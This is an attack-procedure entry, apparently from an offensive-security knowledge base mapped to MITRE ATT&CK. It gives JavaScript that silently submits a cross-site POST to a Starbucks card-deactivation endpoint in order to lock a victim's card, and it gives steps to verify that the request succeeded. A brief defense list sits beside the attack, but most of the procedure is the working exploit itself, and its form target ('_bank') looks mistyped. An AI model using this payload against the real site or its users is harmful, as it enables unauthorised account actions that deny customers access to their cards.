---
tags:
  - csrf
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:30.046Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 2370797e-cab8-430e-a1ab-1552419f00f5
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
---
# Submit-CSRF-Deactivation-Form-One

## Summary

This procedure automates the submission of the first deactivation form to the Starbucks zero-balance endpoint using JavaScript, bypassing CSRF protections to initiate card lockout.

## Description

After a 1500ms delay, JavaScript creates and submits a form targeting an iframe, sending a POST request to https://www.starbucks.com/account/card/loststolenzerobalance. The lack of token validation allows this cross-origin request to succeed in the victim's session context.

## Requirements

1. Loaded Starbucks lost/stolen page from previous step
2. Form data for card ID (inferred from session or hardcoded if known)
3. Iframe element in the malicious page

## Defense

Defensive measures and detection strategies:

- Require unique CSRF tokens in all forms and validate on server
- Log and alert on unexpected POSTs to sensitive endpoints
- Use SameSite=Strict cookies to prevent cross-site requests

## Objectives

1. Submit initial deactivation request
2. Exploit missing protections
3. Trigger server-side processing

## Instructions

### Step 1: Add Delay and Form Creation

**Context**: Use setTimeout to delay submission and create form1.

In the JavaScript:

```javascript
setTimeout(function() {
  var form1 = document.createElement('form');
  form1.method = 'POST';
  form1.target = '_bank';
  form1.action = 'https://www.starbucks.com/account/card/loststolenzerobalance';
  // Add form fields, e.g., card ID
  document.body.appendChild(form1);
  form1.submit();
}, 1500);
```

> This submits after 1.5 seconds, hidden in an iframe.

### Step 2: Verify Submission

**Context**: Check network tab for successful POST.

Monitor browser dev tools for the request.

> Expected: 200 OK response without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web-vulnerability]]
